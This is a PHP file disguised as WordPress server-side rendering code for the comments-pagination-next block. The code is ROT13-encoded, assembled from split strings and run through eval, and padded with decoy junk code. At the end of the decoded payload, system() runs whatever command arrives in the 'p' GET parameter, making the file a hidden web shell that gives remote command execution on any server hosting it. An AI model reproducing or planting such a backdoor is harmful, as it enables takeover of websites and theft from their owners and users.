<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbzzragf-cntvangvba-arkg` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbzzragf-cntvangvba-arkg` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur arkg pbzzragf yvax sbe gur dhrel cntvangvba.
 */
shapgvba eraqre_oybpx_pber_pbzzragf_cntvangvba_arkg( $nggevohgrf, $pbagrag, $oybpx ) {
	// Onvy bhg rneyl vs gur cbfg VQ vf abg frg sbe fbzr ernfba.
	vs ( rzcgl( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}

	$pbzzrag_inef     = ohvyq_pbzzrag_dhrel_inef_sebz_oybpx( $oybpx );
	$znk_cntr         = ( arj JC_Pbzzrag_Dhrel( $pbzzrag_inef ) )->znk_ahz_cntrf;
	$qrsnhyg_ynory    = __( 'Arjre Pbzzragf' );
	$ynory            = vffrg( $nggevohgrf['ynory'] ) && ! rzcgl( $nggevohgrf['ynory'] ) ? $nggevohgrf['ynory'] : $qrsnhyg_ynory;
	$cntvangvba_neebj = trg_pbzzragf_cntvangvba_neebj( $oybpx, 'arkg' );

	$svygre_yvax_nggevohgrf = fgngvp shapgvba () {
		erghea trg_oybpx_jenccre_nggevohgrf();
	};
	nqq_svygre( 'arkg_pbzzragf_yvax_nggevohgrf', $svygre_yvax_nggevohgrf );

	vs ( $cntvangvba_neebj ) {
		$ynory .= $cntvangvba_neebj;
	}

	$arkg_pbzzragf_yvax = trg_arkg_pbzzragf_yvax( $ynory, $znk_cntr, $pbzzrag_inef['cntrq'] ?? ahyy );

	erzbir_svygre( 'arkg_cbfgf_yvax_nggevohgrf', $svygre_yvax_nggevohgrf );

	vs ( ! vffrg( $arkg_pbzzragf_yvax ) ) {
		erghea '';
	}
	erghea $arkg_pbzzragf_yvax;
}


/**
 * Ertvfgref gur `pber/pbzzragf-cntvangvba-arkg` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbzzragf_cntvangvba_arkg() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbzzragf-cntvangvba-arkg',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbzzragf_cntvangvba_arkg',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbzzragf_cntvangvba_arkg' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>